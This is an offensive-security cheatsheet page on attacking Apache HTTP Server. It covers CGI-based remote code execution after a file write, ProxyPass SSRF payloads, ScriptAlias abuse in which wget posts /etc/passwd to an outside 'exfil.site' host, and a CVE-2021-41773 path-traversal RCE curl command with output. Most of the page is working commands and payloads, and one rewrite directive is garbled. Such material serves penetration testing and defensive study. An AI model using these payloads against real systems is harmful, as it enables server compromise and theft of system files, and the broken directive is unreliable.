---
title: "Apache"
description: "Cheatsheet on Apache HTTP"
lead: "Cheatsheet on Apache HTTP"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "framework"
weight: 620
toc: true
---

## Apache

[Apache HTTP](https://httpd.apache.org/) is a widely-used open-source web server software. It provides HTTP server functionality and supports customizable modules. It's maintained by the Apache Software Foundation.

## File Write to RCE via CGI


In order to get your CGI programs to work properly, you'll need to have Apache configured to permit CGI execution.

```bash
LoadModule cgid_module modules/mod_cgid.so
# or
LoadModule cgi_module modules/mod_cgi.so
```

File `/var/www/html/.htaccess`:

```
Options +ExecCGI
AddHandler cgi-script .sh
```

File `/var/www/html/shell.sh`:

```sh
#!/bin/sh
echo -ne "Content-Type: text/html\n\n"
id > /var/www/html/static/output.png
```

> `shell.sh` must be executable (i.e. 755)

## Misconfiguration

### SSRF - ProxyPass & No ending slash

No ending slash at the end of the `ProxyPass` directive allow an SSRF attack.

```xml
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>
  ServerName victim.com
  ProxyPass / http://example.com
</VirtualHost>
```

- `http://victim.com/@attacker.com/`
- `http://victim.com/.attacker.com/`

### ModCGI - ScriptAlias directive

The [ScriptAlias](https://httpd.apache.org/docs/2.4/mod/mod_alias.html#scriptalias) directive tells Apache that a particular directory is set aside for CGI programs.

```bash
ScriptAlias /cgi-bin /usr/bin
```

```bash
# Read file (OOB)
GET /cgi-bin/wget?https://exfil.site/+--post-file+/etc/passwd

# Read file
GET /cgi-bin/pr?/etc/passwd

# Execute file (output in stderr)
GET /cgi-bin/env?/bin/ls
```

## Vulnerabilities

### CVE-2023-25690 - Request Smuggling

- Version: `2.4.0-55`

```bash
RewriteEngine "^/here/(.*)" "http://example.com:8080/elsewhere?$1";
RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1";
```

### CVE-2021-41773 - Path Traversal & Potential RCE

- Version: `2.4.49`

```bash
$ curl 'http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' \
    -d 'echo Content-Type: text/plain; echo; id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Resources

- [weird_proxies / Apache](https://github.com/GrrrDog/weird_proxies/blob/master/Apache.md)
- [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)
